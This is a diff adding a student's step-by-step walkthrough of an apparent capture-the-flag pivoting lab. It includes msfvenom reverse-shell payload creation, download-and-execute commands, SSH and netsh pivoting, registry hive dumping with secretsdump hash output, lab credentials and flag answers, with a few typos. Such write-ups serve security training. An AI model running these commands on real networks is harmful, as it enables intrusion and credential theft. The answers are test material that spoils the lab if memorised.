@@ -15,28 +15,118 @@ Keep in mind the tools and tactics you practiced throughout this module. Each on
 
 
 
-Question 1 - Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.
+Question 1 - Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer. - webadmin 
+1) put IP in /etc/hosts -> 10.129.128.83  support.inlanefreight.local  inlanefreight.local
+2) in firefox go to webshell they give us at support.inlanefreight.local
+3) cd /home -> cd /webadmin -> look at both files 
+4) copy RSA key to host machine 
+5) other file = in order to reach server01 or other servers in the subnet from here you have to us the user account: mlefay:Plain Human work!
+6) long story short the answer to this question is simply webadmin 
+
+Question 2 - Submit the credentials found in the user's home directory. (Format: user:password) - mlefay:Plain Human work! 
+steps above 
+
+Question 3 - Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer. - 172.16.5.35
+1) on HOST MACHINE set up msfconsole
+1.a) use exploit/multi/handler
+set LHOST 10.10.14.119
+set LPORT 8080
+set payload linux/x64/meterpreter/reverse_tcp
+ensure payload = linux/x64/meterpreter/reverse_tcp 
+run
+2) on HOST MACHINE - msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1194 -f elf -o backupjob LPORT=8080
+3) ON HOST - python3 -m http.server 
+4) ON WEBSHELL - cd /tmp -> wget 10.10.14.119:8000/backupjob -O backupjob -> chmod +x backupjob -> ./backupjob 
+5) back to msfconsole listener we have a shell 
+6) oky lets back it up a couple steps... SSH in with the key we found earlier -> ssh -D 9050 webadmin@support.inlanefreight.local -i webadminrsa 
+7) cat .bash_history 
+8) find -> for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done -> run this 
+9) get the other host 172.16.5.35 
 
 
+Question 4 - Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer. - S1ngl3-Piv07-3@sy-Day
+1) proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-resolution /cert:ignore /drive:shared,/home/htb-ac-1235531/Desktop
+2) go to C drive 
+3) get flag - S1ngl3-Piv07-3@sy-Day 
+4)  from the server manager we see another IP - 172.16.6.35 - bonus 
 
-Question 2 - Submit the credentials found in the user's home directory. (Format: user:password)
+Question 5 - In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable? - vfrank
+1) opn cmd on mfley as admin 
+2) mkdir c:\temp
+3) cd c:\temp
+4) reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+reg.exe save hklm\security C:\temp\security.save
+5) move from rdp'd session to kali desktop 
+6) on kali machine run python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL 
+
+OUTPUT : Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+apendragon:1002:aad3b435b51404eeaad3b435b51404ee:222007372da023ed0cdf0a4606bf9b23:::
+mlefay:1003:aad3b435b51404eeaad3b435b51404ee:2831bf1e4e0841d882328d5481fb5c92:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7b2aeb20037c28bc44032f7081f304df: (2022-05-17 16:09:37)
+INLANEFREIGHT.LOCAL/vfrank:$DCC2$10240#vfrank#cfaf1869163aa26757496e1cd9970316: (2022-05-18 18:38:43)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:21ce18b1a025d4b0b01c0e716e99d476
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x2c1bed0e346af06d64c32dcfd108d8fb3af1e353
+dpapi_userkey:0x8a888dcf7becc69d4065caf26b6a534ab160144c
+
+vfrank : Imply wet Unmasked! 
 
 
-Question 3 - Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.
-
-
-
-Question 4 - Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.
-
-
-
-Question 5 - In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
-
-
-Question 6 - For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.
+Question 6 - For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation. - N3tw0rk-H0pp1ng-f0R-FuN 
+1) using netsh on the 172.16.5.35 rdp'd session from windows server to windows 10 workstation for vfrank 
+2) netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.5.35 connectport=3389 connectaddress=172.16.6.25
+3) proxychains xfreerdp /v:172.16.5.35:8080 /u:vfrank /p:'Imply wet Unmasked!' /d:INLANEFREIGHT.LOCAL /dynamic-resolution /cert:ignore /drive:shared,/home/htb-ac-1235531/Desktop
+4) go to C drive -> fing flag.txt -> N3tw0rk-H0pp1ng-f0R-FuN 
 
 
 Question 7 - Submit the contents of C:\Flag.txt located on the Domain Controller.
+1) open cmd on vfrank as admin and run through the SAM attack again. 
+2) mkdir c:\temp
+3) cd c:\temp
+4) reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+reg.exe save hklm\security C:\temp\security.save
+5) move from rdp'd session to kali desktop 
+6) on kali machine run python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL 
+
+OUTPUT : 
+
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+apendragon:1003:aad3b435b51404eeaad3b435b51404ee:222007372da023ed0cdf0a4606bf9b23:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/vfrank:$DCC2$10240#vfrank#cfaf1869163aa26757496e1cd9970316: (2025-02-05 20:57:53)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:4f37dc9027d40e03423e084129f6b58299fc5fd854d7b06bcdf20594f5d091795a6d180e2faad9b3c171ae1309b5886dd2d85f944e1355ff291cbe61c670ea0687b84b9c7b32ddbba75ae4102e4175a2d6a124cfe15bcd7f69ea654ea0a36933661e4f959ebe5451e19399b97f270527980bf6ab37def9df91f753d78ba3b7770b636edb952bafe20a1037d2c44bfdb1346e3e55bffc12480d3bd17dfc8663c44906799c900e636e4c306a06f49d69c4ac6ddee4d2eea1e4f24c2d76c16d12cc3bc619a6f11d00cf05f1eaa75565f971096167c8e4dafd86b4345f4a6de37d4a2ca4071607f6804e1e24e1a29c2eb604
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1deaaf11a300c8c538d570e4561118c6
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
 
 
+7) this didnt tell us anything new 
+8) if we transfer bloodhound.exe to win10 machine and run it 
+9) Copy the collected ZIP data file to kali, to import into `Bloodhound`.  
+> Login to `bloodhound 
+10) shortest paths to domain admins from owned pricipals shwos us the vfrank is a domain admin 
+11) go back to file explorer -> this pc -> AutomateDCADmin (Z:) -> flag -> 3nd-0xf-Th3-R@inbow! 
+
+Only thing i forgot how i did was get the 172.16.5.25 IP for vfrank... im sure it came with running an proxychains pingsweep or nmap on 172.16.5.0/24 network 
+
+otherwise this was MUCH smoother than last few times. look at us making progress. 
 
